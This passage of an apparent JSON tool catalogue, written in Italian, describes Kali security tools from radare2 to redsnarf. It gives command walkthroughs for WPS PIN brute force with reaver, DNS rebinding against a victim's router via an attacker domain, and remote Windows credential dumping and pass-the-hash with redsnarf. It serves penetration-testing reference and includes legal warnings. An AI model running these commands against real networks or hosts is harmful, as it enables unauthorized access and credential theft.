    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Radare2</strong> (r2) è il framework di reverse engineering open-source più completo e versatile disponibile. A differenza di tool single-purpose, r2 integra in un unico ambiente: disassembler multi-architettura, debugger, analizzatore binario, hex editor, diff tool, e shell scriptabile. Supporta oltre 50 architetture (x86, x64, ARM, MIPS, PowerPC, SPARC, AVR, etc.) e decine di formati file (ELF, PE, Mach-O, DEX, raw, etc.). L'interfaccia command-line, sebbene inizialmente ostica, offre potenza e flessibilità impareggiabili una volta padroneggiata. Il sistema di comandi gerarchico permette di fare praticamente qualsiasi cosa in pochi caratteri. r2pipe estende le capacità permettendo scripting in Python, JavaScript, Go, e altri linguaggi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Architecture Support:</strong> Disassembly nativo per x86/x64, ARM/ARM64, MIPS, PowerPC, SPARC, AVR, 8051, Z80, e molte altre. Aggiungere supporto per nuove architetture è relativamente semplice grazie all'architettura modulare.</p><p><strong>Advanced Analysis Engine:</strong> L'analisi automatica (aaa) identifica funzioni, basic blocks, cross-references, variabili locali, argomenti, e costruisce control flow graph. L'analisi ESIL (Evaluable Strings Intermediate Language) permette emulazione parziale per comprendere valori a runtime.</p><p><strong>Integrated Debugger:</strong> Debugging nativo su Linux, Windows, macOS, e piattaforme embedded via gdb/lldb. Breakpoint, watchpoint, step, continue, memory inspection, register modification. Perfetto per analisi dinamica.</p><p><strong>Extensibility:</strong> r2pipe espone tutte le funzionalità via API, permettendo scripting avanzato. Plugin in C, Python, o Go estendono le capacità. Community attiva produce costantemente nuovi plugin e script.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>R2 usa un sistema di comandi single-letter. La learning curve è ripida ma la potenza è impareggiabile.</p><pre><code># Apertura binario con analisi automatica\nr2 -A ./binary\n# -A equivale a eseguire 'aaa' all'avvio\n\n# === ANALISI ===\naaa          # Analisi completa (funzioni, xrefs, strings, etc.)\nafl          # Lista tutte le funzioni trovate\nafl~main     # Filtra funzioni contenenti 'main'\naxt @sym.main # Cross-references a main (chi chiama main)\naxf @sym.main # Cross-references da main (chi main chiama)\n\n# === DISASSEMBLY ===\npdf @main    # Print disassembly function main\npdf @0x401000 # Disassembly a indirizzo specifico\npd 20        # Print 20 istruzioni da posizione corrente\nVV           # Visual mode - graph view delle funzioni\n\n# === NAVIGAZIONE ===\ns main       # Seek: vai alla funzione main\ns 0x401000   # Seek a indirizzo\ns+ 10        # Avanza di 10 byte\n\n# === INFORMAZIONI ===\nii           # Import table\niS           # Sezioni del binario\niz           # Strings nel binario\nizz          # Strings in tutto il file (anche data sections)\n\n# === DEBUGGING ===\nr2 -d ./binary  # Avvia in debug mode\ndb main      # Set breakpoint su main\ndb 0x401234  # Breakpoint su indirizzo\ndc           # Continue execution\nds           # Step into\ndso          # Step over\ndr           # Show registers\ndm           # Memory maps\n\n# === PATCHING ===\nwa nop @0x401234  # Write assembly: NOP a indirizzo\nwx 90909090 @addr # Write hex bytes\n\n# === SCRIPTING con r2pipe ===\n# Python example:\nimport r2pipe\nr2 = r2pipe.open('./binary')\nr2.cmd('aaa')\nfunctions = r2.cmdj('aflj')  # Output JSON\n\n# One-liner per batch analysis\nr2 -q -c 'aaa; afl; q' binary</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, r2 fornisce ambiente completo per analisi statica e dinamica. Il disassembler identifica funzioni interessanti, il debugger permette di osservare comportamento runtime in ambiente controllato.</p><p>Durante <strong>CTF Competitions</strong>, r2 è lo strumento preferito per challenge di reverse engineering. La velocità di navigazione e analisi lo rende ideale per competizioni con tempo limitato.</p><p>Nella <strong>Vulnerability Research</strong>, analisi di binari per identificare vulnerabilità: buffer overflow, format string, use-after-free. L'emulazione ESIL aiuta a tracciare data flow senza eseguire il binario.</p><p>Per <strong>Firmware Analysis</strong>, il supporto per architetture embedded (ARM, MIPS) e formati raw lo rende ideale per analizzare firmware di router, IoT, e dispositivi embedded.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Learning Curve:</strong> L'interfaccia CLI è potente ma richiede investimento significativo per padroneggiare. Il sistema di comandi non è intuitivo inizialmente. Documentazione disponibile con '?' dopo ogni comando.</p><p><strong>GUI Alternative:</strong> Cutter (https://cutter.re/) fornisce interfaccia grafica basata su r2. Ideale per chi preferisce GUI senza rinunciare al backend r2.</p><p><strong>Comparison:</strong> Per puro decompilation, Ghidra offre output più leggibile. r2 eccelle in scriptability, debugging, e supporto architetture. Idealmente, usare entrambi in combinazione.</p><p><strong>Resource Usage:</strong> Analisi completa di binari grandi può richiedere tempo e memoria significativi. Usare 'aa' invece di 'aaa' per analisi più veloce ma meno completa.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "raven",
    "name": "raven",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/raven/",
    "desc": "Pipelines scanner per GitHub Actions e CI/CD security con detection di poisoning.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Raven</strong> è uno scanner di sicurezza specializzato nell'analisi di pipeline CI/CD, con focus primario su GitHub Actions. Identifica vulnerabilità che possono portare a supply chain attacks, una delle minacce più critiche nel software development moderno. Raven analizza i workflow YAML cercando: pipeline poisoning (possibilità per attaccanti di iniettare codice malevolo nel build), injection vulnerabilities (uso non sanitizzato di input controllabili), secrets exposure (leak di credenziali), permission escalation, e misconfigurazioni che violano il principio del least privilege. Essenziale per DevSecOps e per red team che vogliono identificare vettori di attacco attraverso CI/CD.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GitHub Actions Deep Analysis:</strong> Parser specializzato per workflow YAML che comprende la semantica di GitHub Actions: triggers, jobs, steps, expressions, contexts. Identifica pattern pericolosi specifici di questa piattaforma.</p><p><strong>Pipeline Poisoning Detection:</strong> Rileva scenari dove un attaccante potrebbe modificare il codice eseguito dalla pipeline: pull_request_target mal configurato, workflow_run abuse, checkout di PR non trusted, script injection via branch names.</p><p><strong>Secrets and Credentials Audit:</strong> Identifica secrets esposti o mal gestiti: hardcoded credentials, secrets passati a step non necessari, output di secrets in log, secrets accessibili da fork.</p><p><strong>Injection Vulnerability Detection:</strong> Trova possibilità di code injection attraverso GitHub contexts (${{ }}) non sanitizzati: titoli PR, body di issue, branch names usati in comandi shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Raven supporta scan di singoli repository o intere organizzazioni GitHub.</p><pre><code># Scan singolo repository pubblico\nraven scan --repo https://github.com/org/vulnerable-repo\n\n# Scan con output JSON per integrazione\nraven scan --repo https://github.com/org/repo --output report.json\n\n# Scan intera organizzazione GitHub\nraven scan --org organization_name --token ghp_xxxxx\n\n# Scan repository privato (richiede token)\nraven scan --repo https://github.com/private/repo --token ghp_xxxxx\n\n# Scan locale di workflow files\nraven scan --path /path/to/.github/workflows/\n\n# Output dettagliato con remediation\nraven scan --repo url --verbose\n\n# Esempio output vulnerabilità:\n# [HIGH] Potential Script Injection in workflow ci.yml\n#   Step: 'Run tests' uses unsanitized ${{ github.event.pull_request.title }}\n#   Impact: Attacker can execute arbitrary commands via PR title\n#   Remediation: Use environment variable instead of direct interpolation\n\n# Scan con filtro severity\nraven scan --repo url --min-severity high\n\n# Export per CI/CD integration (exit code non-zero se trovate vulnerabilità)\nraven scan --repo url --fail-on high</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Supply Chain Security Audit</strong>, Raven identifica come un attaccante potrebbe compromettere la build pipeline per iniettare codice malevolo in artifact distribuiti. Un singolo workflow vulnerabile può compromettere tutti i downstream consumers.</p><p>In <strong>DevSecOps Integration</strong>, Raven può essere integrato nella CI/CD stessa per scansionare i workflow ad ogni PR. Previene l'introduzione di nuove vulnerabilità prima che raggiungano main branch.</p><p>Durante <strong>Red Team Engagements</strong>, dopo aver ottenuto accesso a un repository (anche solo fork pubblico), Raven identifica come escalare l'accesso sfruttando vulnerabilità CI/CD per eseguire codice con secrets dell'organizzazione.</p><p>Per <strong>Dependency Security</strong>, analizza non solo i workflow del repo target ma anche actions third-party utilizzate, identificando rischi da dependencies non trusted o versioni pinned in modo insicuro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Rate Limits:</strong> Scan di organizzazioni grandi o multiple repositories richiede GitHub token per evitare rate limiting. Token con scope 'repo' per repository privati.</p><p><strong>Public Repository Legality:</strong> Scan di repository pubblici è completamente legale e non richiede autorizzazione. Le informazioni sui workflow sono pubblicamente accessibili.</p><p><strong>Private Repository Authorization:</strong> Per repository privati, è necessaria autorizzazione esplicita dall'owner. Il token deve avere accesso al repository target.</p><p><strong>Responsible Disclosure:</strong> Se si trovano vulnerabilità in progetti open-source, seguire responsible disclosure practices. Molti progetti hanno security policy documentate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "reaver",
    "name": "reaver",
    "version": "1.6.6",
    "icon": "../app/icons/reaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reaver/",
    "desc": "Brute force WPS PIN per ottenere password WPA/WPA2 su access point vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Reaver</strong> è il tool di riferimento per attacchi contro WPS (WiFi Protected Setup), un protocollo che permette di connettersi a reti WPA/WPA2 usando un PIN di 8 cifre invece della password. La debolezza fondamentale di WPS è che il PIN viene validato in due metà separate: prima i primi 4 digit, poi i secondi 3 (l'ottavo è checksum). Questo riduce lo spazio di ricerca da 10^8 (100 milioni) a 10^4 + 10^3 = 11.000 tentativi massimi. Reaver automatizza il brute force di tutti i possibili PIN, tipicamente completando l'attacco in 4-10 ore. L'integrazione con Pixie Dust (pixiewps) permette di crackare istantaneamente router con implementazioni WPS vulnerabili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WPS PIN Brute Force:</strong> Enumera sistematicamente tutti i PIN possibili inviando M4/M6 message e analizzando le risposte. L'algoritmo ottimizzato testa prima la prima metà del PIN, poi la seconda, riducendo drasticamente il tempo.</p><p><strong>Pixie Dust Attack:</strong> Integrazione con pixiewps per sfruttare implementazioni WPS con PRNG debole. Se il router è vulnerabile, il PIN viene recuperato in secondi analizzando i nonce scambiati durante l'handshake, senza necessità di brute force.</p><p><strong>Rate Limiting Evasion:</strong> Molti router implementano lockout dopo troppi tentativi falliti. Reaver include delay configurabili, rilevamento di lockout, e strategie per aggirare o attendere il reset del contatore.</p><p><strong>Session Persistence:</strong> Salva automaticamente lo stato dell'attacco permettendo di riprendere da dove si era interrotti. Essenziale per attacchi lunghi che potrebbero essere interrotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Reaver richiede interfaccia wireless in monitor mode e BSSID del target.</p><pre><code># PREREQUISITI\n# 1. Identificare interfaccia wireless\niwconfig\n\n# 2. Attivare monitor mode\nairmon-ng check kill   # Uccide processi che interferiscono\nairmon-ng start wlan0  # Crea wlan0mon\n\n# 3. Identificare target con WPS abilitato\nwash -i wlan0mon\n# Output: BSSID, Channel, WPS Locked status\n\n# ATTACCO STANDARD\n# Brute force WPS PIN\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv\n# -c: canale (ottimizza performance)\n# -vv: verbose output\n\n# PIXIE DUST (molto più veloce se vulnerabile)\nreaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv\n# -K 1: abilita Pixie Dust attack\n# Se vulnerabile, PIN recuperato in secondi\n\n# EVASIONE RATE LIMITING\n# Con delay tra tentativi\nreaver -i wlan0mon -b BSSID -d 5 -vv\n# -d 5: 5 secondi di delay\n\n# Riprendi sessione precedente\nreaver -i wlan0mon -b BSSID -vv\n# Reaver riprende automaticamente dall'ultimo PIN\n\n# Forzare stato specifico\nreaver -i wlan0mon -b BSSID -p 1234 -vv\n# -p: inizia da PIN specifico (prima metà)\n\n# OPZIONI AVANZATE\n# Timeout e retry\nreaver -i wlan0mon -b BSSID -t 5 -T 1 -vv\n# -t: receive timeout\n# -T: M5/M7 timeout\n\n# Output tipico con successo:\n# [+] WPS PIN: '12345670'\n# [+] WPA PSK: 'PasswordDellaRete'\n# [+] AP SSID: 'NomeRete'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>WiFi Penetration Testing</strong>, Reaver è il metodo primario per attaccare reti con WPS abilitato. Anche con password WPA2 complesse, un PIN WPS debole compromette l'intera rete.</p><p>Per <strong>Security Audit Aziendale</strong>, verifica che WPS sia disabilitato su tutti gli access point dell'infrastruttura. WPS dovrebbe essere disabilitato by default su qualsiasi rete enterprise.</p><p>Durante <strong>Red Team Physical Assessment</strong>, accesso WiFi è spesso il primo passo per infiltrazione nella rete interna. Reaver può fornire accesso dove altri attacchi (dictionary, deauth/capture) falliscono.</p><p>In <strong>Home Network Security</strong>, per verificare che il proprio router non sia vulnerabile. Molti router consumer hanno ancora WPS abilitato di default.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità Critica:</strong> Attaccare reti WiFi senza autorizzazione è reato penale in tutte le giurisdizioni. Anche solo il tentativo, senza successo, può costituire reato. Utilizzare ESCLUSIVAMENTE su reti di proprietà o con autorizzazione scritta esplicita.</p><p><strong>Tempo di Attacco:</strong> Brute force completo richiede 4-10 ore dipendendo dal router. Pixie Dust riduce a secondi se vulnerabile. Session resume permette di interrompere e riprendere.</p><p><strong>WPS Lockout:</strong> Router moderni bloccano WPS dopo 3-10 tentativi falliti, rendendo l'attacco impraticabile. Il lockout può durare da minuti a permanente (fino a reboot). Verificare prima con wash se WPS è in stato \"Locked\".</p><p><strong>Detection:</strong> L'attacco genera traffico anomalo rilevabile da WIDS enterprise. Pattern di authentication frame ripetuti a singolo BSSID è signature nota.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "rebind",
    "name": "rebind",
    "version": "0.3.4",
    "icon": "../app/icons/rebind-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rebind/",
    "desc": "DNS rebinding attack tool per bypass same-origin policy e accesso a servizi interni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rebind</strong> è un tool per eseguire attacchi DNS rebinding, una tecnica sofisticata per bypassare la Same-Origin Policy (SOP) dei browser web. La SOP normalmente impedisce a JavaScript di un dominio di accedere a risorse di un altro dominio. DNS rebinding aggira questa protezione manipolando le risposte DNS: inizialmente il dominio dell'attaccante risolve all'IP del server malevolo (per caricare il JavaScript), poi il TTL scade e una successiva query risolve all'IP di un servizio interno della vittima (192.168.x.x, 10.x.x.x, localhost). Il browser, credendo di comunicare con lo stesso dominio (origin), permette al JavaScript di accedere al servizio interno come se fosse autorizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Malicious DNS Server:</strong> Server DNS integrato che risponde con TTL estremamente basso (tipicamente 0 o 1 secondo). La prima risposta punta al web server dell'attaccante, le successive all'IP interno target specificato.</p><p><strong>Payload Web Server:</strong> Serve pagine HTML con JavaScript che implementa la logica di rebinding: attende la scadenza del TTL, poi effettua richieste HTTP al \"proprio\" dominio che ora risolve all'IP interno.</p><p><strong>Internal Service Access:</strong> Permette al JavaScript nel browser della vittima di interagire con servizi interni: leggere risposte HTTP, inviare POST request, potenzialmente esfiltrare dati o modificare configurazioni.</p><p><strong>Target Configuration:</strong> IP e porta del target interno sono configurabili. Può attaccare router (192.168.1.1), server interni, IoT devices, o qualsiasi servizio raggiungibile dalla rete della vittima.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'attacco richiede che la vittima visiti un dominio controllato dall'attaccante.</p><pre><code># Setup prerequisiti:\n# 1. Dominio con NS record che punta al tuo server\n# 2. Server con IP pubblico per DNS e web server\n\n# Avvio server rebind\nrebind --domain evil.attacker.com --target 192.168.1.1 --port 80\n# --domain: dominio controllato dall'attaccante\n# --target: IP interno da attaccare\n# --port: porta del servizio interno\n\n# Flow dell'attacco:\n# 1. Vittima visita http://rebind.evil.attacker.com\n# 2. DNS risolve all'IP dell'attacker (prima risposta)\n# 3. Browser carica pagina con JavaScript malevolo\n# 4. JavaScript attende TTL expiration\n# 5. JavaScript fa richiesta a rebind.evil.attacker.com\n# 6. DNS ora risolve a 192.168.1.1 (seconda risposta)\n# 7. Browser pensa sia stesso origin, permette la richiesta\n# 8. JavaScript accede al router interno!\n\n# Configurazione avanzata\nrebind --domain evil.com --target 127.0.0.1 --port 8080\n# Attacco a servizi localhost della vittima\n\n# Con porta web server custom\nrebind --domain evil.com --target 10.0.0.50 --port 22 --webport 8888</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Router Exploitation</strong>, l'attacco classico è contro pannelli admin di router domestici. La vittima visita un sito malevolo, e il JavaScript accede a http://192.168.1.1 per modificare configurazioni DNS, aprire porte, o estrarre credenziali WiFi.</p><p>Per <strong>Internal Network Reconnaissance</strong>, dal browser della vittima si possono scansionare servizi interni, identificare host attivi, e mappare la rete interna attraverso timing delle risposte HTTP.</p><p>In <strong>Red Team Operations</strong>, combinato con phishing, permette di accedere a servizi interni aziendali senza compromettere direttamente la macchina della vittima - solo il browser viene \"abusato\".</p><p>Per <strong>IoT Exploitation</strong>, molti dispositivi IoT hanno web interface senza autenticazione o con credenziali default. DNS rebinding permette di controllarli remotamente attraverso la rete della vittima.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Victim Interaction Required:</strong> L'attacco richiede che la vittima visiti volontariamente il dominio malevolo. Social engineering (phishing, malvertising, sito compromesso) è necessario per il delivery.</p><p><strong>Browser Mitigations:</strong> Browser moderni implementano protezioni parziali: alcuni ignorano risposte DNS con TTL 0, altri bloccano risoluzioni a IP privati. L'efficacia varia tra browser e versioni.</p><p><strong>DNS Resolver Behavior:</strong> Alcuni DNS resolver (es. quelli ISP) ignorano TTL bassi e cachano comunque. Questo può rendere l'attacco meno affidabile o richiedere più tempo.</p><p><strong>HTTPS Complications:</strong> Se il servizio interno usa HTTPS, l'attacco fallisce per certificate mismatch. Funziona principalmente contro servizi HTTP plain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "SSRF"
    ],
    "notes": null
  },
  {
    "id": "recon-ng",
    "name": "recon-ng",
    "version": "5.1.2",
    "icon": "../app/icons/recon-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/recon-ng/",
    "desc": "Framework OSINT modulare con workspace, database e decine di moduli reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Recon-ng</strong> è un framework di reconnaissance modulare con interfaccia stile Metasploit. Fornisce workspace per organizzare progetti, database SQLite per risultati, e decine di moduli per OSINT su domini, email, social media e infrastrutture.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular Architecture:</strong> marketplace di moduli per diverse fonti OSINT</p><p><strong>Workspace:</strong> organizzazione progetti separati con database dedicati</p><p><strong>API Integration:</strong> supporto API Shodan, VirusTotal, Have I Been Pwned</p><p><strong>Reporting:</strong> export risultati in HTML, CSV, JSON</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio recon-ng\nrecon-ng\n\n# Creazione workspace\nworkspaces create target_company\n\n# Installazione modulo\nmarketplace install recon/domains-hosts/hackertarget\n\n# Uso modulo\nmodules load recon/domains-hosts/hackertarget\ninfo\noptions set SOURCE target.com\nrun</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, raccolta organizzata informazioni su target.</p><p>Per <strong>pentest</strong>, fase reconnaissance strutturata.</p><p>Per <strong>threat intel</strong>, mappatura infrastruttura di threat actors.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Keys:</strong> molti moduli richiedono chiavi API.</p><p><strong>Rate Limiting:</strong> query massive possono essere limitate.</p><p><strong>Attribution:</strong> alcune query identificano la sorgente.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "reconspider",
    "name": "reconspider",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reconspider/",
    "desc": "Recon automation framework con IP/domain lookup, port scan, honeypot detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ReconSpider</strong> è un framework Python per automazione della reconnaissance che aggrega informazioni da multiple fonti in un'unica interfaccia. Combina capacità passive (OSINT) e attive (scanning) per fornire un quadro completo di un target. Esegue IP intelligence (geolocation, ASN, blacklist status), domain reconnaissance (DNS, WHOIS, subdomain enumeration), port scanning integrato, e una funzionalità distintiva di honeypot detection per identificare se un target è un sistema di monitoraggio. L'interfaccia interattiva guida l'utente attraverso le diverse opzioni, rendendolo accessibile anche a chi inizia con la reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Intelligence Aggregation:</strong> Per un dato IP, raccoglie: geolocalizzazione (paese, città, ISP), informazioni ASN (Autonomous System Number), verifica presenza in blacklist di spam/malware, reverse DNS lookup, e storico WHOIS. Tutto aggregato da API pubbliche.</p><p><strong>Domain Reconnaissance:</strong> Enumera tutti i DNS record (A, AAAA, MX, NS, TXT, SOA), estrae informazioni WHOIS (registrant, date, nameservers), cerca subdomain tramite diverse tecniche, e identifica tecnologie web utilizzate.</p><p><strong>Integrated Port Scanning:</strong> Scanner TCP integrato per identificare servizi aperti senza dipendere da tool esterni. Permette di passare rapidamente da OSINT passivo a enumeration attiva nello stesso workflow.</p><p><strong>Honeypot Detection:</strong> Funzionalità unica che analizza diversi indicatori per determinare se un IP/host è un honeypot: analisi banner, comportamento anomalo servizi, pattern di risposta tipici di honeypot noti (Cowrie, Dionaea, etc.).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ReconSpider offre interfaccia interattiva guidata e opzioni command-line.</p><pre><code># Avvio interfaccia interattiva\npython reconspider.py\n# Menu guida attraverso le opzioni disponibili\n\n# === IP INTELLIGENCE ===\n# Raccolta informazioni su IP\nreconspider --ip 8.8.8.8\n# Output: geolocation, ASN, blacklist status, reverse DNS\n\n# === DOMAIN RECONNAISSANCE ===\n# Enumerazione completa dominio\nreconspider --domain target.com\n# Output: DNS records, WHOIS, subdomains trovati\n\n# === PORT SCANNING ===\n# Scan porte comuni\nreconspider --port 192.168.1.1\n# Output: porte aperte e servizi identificati\n\n# === HONEYPOT DETECTION ===\n# Verifica se target è honeypot\nreconspider --honeypot 192.168.1.100\n# Output: probabilità honeypot con indicatori\n\n# === COMBINAZIONI ===\n# Recon completa (IP + domain + ports)\nreconspider --full target.com\n\n# Output su file\nreconspider --domain target.com --output results.json\n\n# Workflow tipico:\n# 1. Domain recon per target iniziale\n# 2. IP intel su server identificati\n# 3. Port scan su host interessanti\n# 4. Honeypot check prima di attacchi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Initial Reconnaissance</strong>, quando si ha un nuovo target, ReconSpider fornisce rapidamente le informazioni base necessarie: chi è il registrant, dove sono i server, quali servizi espongono, tutto in pochi comandi.</p><p>Durante <strong>Threat Hunting</strong>, analisi di IP sospetti identificati da SIEM o firewall. La combinazione di geolocation, blacklist check, e honeypot detection aiuta a capire se un IP è legittimo, malevolo, o un honeypot di ricerca.</p><p>Nel <strong>Penetration Testing Preparation</strong>, la fase iniziale di intelligence gathering viene accelerata. Invece di lanciare manualmente whois, dig, nmap, ReconSpider aggrega tutto.</p><p>Per <strong>Red Team Pre-Engagement</strong>, honeypot detection è critica. Attaccare un honeypot compromette l'operazione, rivela TTP, e allerta il target. Verificare sempre prima di procedere con exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active vs Passive:</strong> Port scanning genera traffico diretto verso il target. I log del target registreranno l'IP sorgente. Domain/IP lookup sono passivi e non generano alert sul target.</p><p><strong>API Dependencies:</strong> Alcune funzionalità dipendono da API esterne (geolocation services, blacklist checkers). I provider di questi servizi potrebbero loggare le query.</p><p><strong>Honeypot Limitations:</strong> La detection non è infallibile. Honeypot sofisticati o configurati per sembrare realistici potrebbero non essere identificati. Usare come indicatore, non come certezza.</p><p><strong>Rate Limiting:</strong> Query massive possono essere rate-limited dai servizi esterni. Usare con moderazione su target multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "redsnarf",
    "name": "redsnarf",
    "version": "0~git20170822",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/redsnarf/",
    "desc": "Recupera credenziali Windows da host remoti: SAM, LSA secrets, cached credentials.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RedSnarf</strong> è un tool Python per credential harvesting e post-exploitation su sistemi Windows remoti. Automatizza il dump di credenziali da macchine Windows accessibili via rete: SAM database (hash utenti locali), LSA secrets (password servizi, credenziali auto-logon, chiavi DPAPI), cached domain credentials, e può eseguire pass-the-hash per autenticarsi con hash recuperati su altri target. Particolarmente utile durante la fase di lateral movement quando si hanno credenziali admin locale su più macchine del dominio. RedSnarf usa Impacket sotto il cofano, semplificando operazioni che altrimenti richiederebbero comandi complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SAM Database Extraction:</strong> Dump remoto del Security Account Manager contenente hash NTLM di tutti gli account locali. Non richiede esecuzione di codice sul target - usa registry save e SMB transfer.</p><p><strong>LSA Secrets Dumping:</strong> Estrae i segreti LSA (Local Security Authority): password di servizi configurati per auto-start, credenziali di auto-logon, chiavi DPAPI system, e altri secrets memorizzati dal sistema.</p><p><strong>Cached Domain Credentials:</strong> Recupera le cached logon credentials (DCC/DCC2 hash) degli ultimi utenti di dominio che si sono autenticati sulla macchina. Utile quando il DC non è raggiungibile.</p><p><strong>Pass-the-Hash Automation:</strong> Una volta recuperati hash NTLM, RedSnarf può usarli automaticamente per autenticarsi su altri target, semplificando il lateral movement senza bisogno di conoscere password in chiaro.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RedSnarf richiede credenziali admin locale sul target (password o hash).</p><pre><code># === AUTENTICAZIONE CON PASSWORD ===\n# Dump credenziali con admin password\npython redsnarf.py -H 192.168.1.100 -u Administrator -p 'Password123' -d WORKGROUP\n# -d: dominio o WORKGROUP per account locali\n\n# === AUTENTICAZIONE CON HASH (PTH) ===\n# Pass-the-Hash per dump credenziali\npython redsnarf.py -H 192.168.1.100 -u admin -hh aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n# -hh: hash formato LM:NTLM\n\n# === DUMP SPECIFICI ===\n# Solo SAM (hash account locali)\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rS\n# -rS: dump SAM\n\n# Solo LSA secrets\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rL\n# -rL: dump LSA secrets\n\n# Cached credentials dominio\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rC\n# -rC: dump cached creds\n\n# === LATERAL MOVEMENT ===\n# Dump su multipli target\npython redsnarf.py -H 192.168.1.100,192.168.1.101,192.168.1.102 -u admin -p pass\n\n# Da file di host\npython redsnarf.py -f hosts.txt -u admin -hh hash\n\n# === OUTPUT ===\n# Esempio output SAM dump:\n# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# localadmin:1001:aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::\n\n# Esempio output LSA:\n# Service_Account: 'ServicePassword123'\n# DefaultPassword: 'AutoLogonPass!'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Post-Exploitation Credential Gathering</strong>, dopo aver compromesso una macchina, RedSnarf estrae rapidamente tutte le credenziali disponibili: hash locali, credenziali dominio cached, e secrets di servizi.</p><p>Per <strong>Lateral Movement</strong>, gli hash recuperati da una macchina vengono usati per autenticarsi su altre. RedSnarf automatizza questo ciclo: dump hash da target A, usa per autenticarti su target B, dump hash, repeat.</p><p>Nella <strong>Domain Escalation</strong>, se un domain admin ha mai fatto login su una macchina compromessa, le sue cached credentials sono lì. Crackate con hashcat/john, forniscono domain admin access.</p><p>Per <strong>Service Account Discovery</strong>, LSA secrets spesso contengono password di service account. Questi account tipicamente hanno privilegi elevati e password che non scadono.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Admin Privileges Required:</strong> Dump di SAM/LSA richiede privilegi amministrativi locali sul target. Senza admin, l'operazione fallisce.</p><p><strong>EDR Detection:</strong> L'accesso al registro SAM/SECURITY e il save di questi hive sono operazioni monitorate da EDR moderni. Può triggerare alert e/o essere bloccato.</p><p><strong>Event Logging:</strong> L'autenticazione remota genera Event ID 4624 (logon) sul target. L'accesso a file di sistema può generare ulteriori eventi se auditing è abilitato.</p><p><strong>Network Traffic:</strong> Usa SMB (445) per trasferire i dump. Traffic analysis può rivelare 